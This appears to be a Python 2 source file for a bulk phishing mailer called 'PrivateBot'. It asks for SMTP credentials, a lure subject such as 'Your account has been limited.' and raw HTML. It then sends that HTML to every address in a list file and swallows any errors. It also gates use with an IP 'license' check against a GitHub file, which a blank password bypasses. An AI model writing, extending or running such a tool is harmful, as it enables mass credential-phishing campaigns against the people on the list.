# encoding=utf8
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import email.message
import smtplib, getpass, requests
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init

####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT		

def banners():
		
		banner = """{}

     _______            __                        __                _______               __     
    /       \          /  |                      /  |              /       \             /  |    
    $$$$$$$  | ______  $$/  __     __  ______   _$$ |_     ______  $$$$$$$  |  ______   _$$ |_   
    $$ |__$$ |/      \ /  |/  \   /  |/      \ / $$   |   /      \ $$ |__$$ | /      \ / $$   | {} 
    $$    $$//$$$$$$  |$$ |$$  \ /$$/ $$$$$$  |$$$$$$/   /$$$$$$  |$$    $$< /$$$$$$  |$$$$$$/   
    $$$$$$$/ $$ |  $$/ $$ | $$  /$$/  /    $$ |  $$ | __ $$    $$ |$$$$$$$  |$$ |  $$ |  $$ | __ 
    $$ |     $$ |      $$ |  $$ $$/  /$$$$$$$ |  $$ |/  |$$$$$$$$/ $$ |__$$ |$$ \__$$ |  $$ |/  |{}
    $$ |     $$ |      $$ |   $$$/   $$    $$ |  $$  $$/ $$       |$$    $$/ $$    $$/   $$  $$/ 
    $$/      $$/       $$/     $/     $$$$$$$/    $$$$/   $$$$$$$/ $$$$$$$/   $$$$$$/     $$$$/  
    {}                                                                                         
                                                                      ->>  Python V2.7  <<-     
                                                                      ->>  Coded by RaiC0d3r  <<-                                                                                              

		\n""".format(fg, fr, fg, sn)
		
		print banner
def sendmails(receiver_email_id):
    smtpserver = raw_input("Ex: (smtp.gmail.com) : ")
    smtpport = raw_input("Ex: (587) : ")    
    sender_email_id = raw_input("Email : ")
    sender_email_id_password = raw_input("Email Passwd : ")
    subject = raw_input("Ex: (Your account has been limited.) : ")      
    index = raw_input("Ex: ('''htmlcode''') : ")

    msg = email.message.Message()
    msg['Subject'] = subject
    msg['From'] = sender_email_id

    msg['To'] = receiver_email_id
    msg.add_header('Content-Type','text/html')
    msg.set_payload(index)

# Send the message via local SMTP server.
    s = smtplib.SMTP(smtpserver, smtpport)
    s.starttls()
    s.login(sender_email_id, sender_email_id_password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
    s.quit()

def passfor():		
    list = open(raw_input("Email List : "),'r').readlines()
    for receiver_email_id in list:
    	try:
           receiver_email_id = receiver_email_id.rstrip()    	
           data=sendmails(receiver_email_id)
        except:
            pass  
 
#Passwd = getpass.getpass("Give Passwd : ")
#if "" in Passwd:
#	passfor()
#else:
#	exit()
banners()
ipv4check = requests.get('http://ipv4.icanhazip.com').text
licensed = requests.get('https://raw.githubusercontent.com/raic0d3r/Private-Bot/master/licensed').text
Passwd = getpass.getpass("Give Passwd : ")
if ipv4check in licensed:
#if "" in Passwd:
	passfor()
elif '' in Passwd:
    passfor()
else:
    exit()    